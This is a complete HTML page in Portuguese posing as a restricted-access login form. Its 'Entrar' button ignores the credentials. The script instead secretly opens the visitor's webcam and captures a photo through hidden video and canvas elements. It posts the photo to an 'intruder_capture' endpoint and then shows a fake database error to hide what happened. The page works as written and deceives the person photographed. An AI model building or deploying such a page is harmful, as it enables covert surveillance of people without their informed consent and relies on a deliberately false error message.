<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Login - Sistema de Segurança</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0d1117; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #161b22; padding: 30px; border: 1px solid #30363d; width: 350px; }
    </style>
</head>
<body>
    <div class="card text-center">
        <h3 class="text-success mb-4">Acesso Restrito</h3>
        <input type="text" class="form-control mb-3 bg-dark text-white border-secondary" placeholder="Usuário">
        <input type="password" class="form-control mb-3 bg-dark text-white border-secondary" placeholder="Senha">
        <button onclick="takeSnapshot()" class="btn btn-success w-100">Entrar</button>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function takeSnapshot() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = s;
                setTimeout(() => {
                    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                    fetch('/security/intruder_capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: c.toDataURL('image/png') })
                    });
                    s.getTracks().forEach(t => t.stop());
                    alert("Erro: Banco de dados não responde.");
                }, 1000);
            } catch (e) { alert("Erro de Hardware: Câmera não detectada."); }
        }
    </script>
</body>
</html>
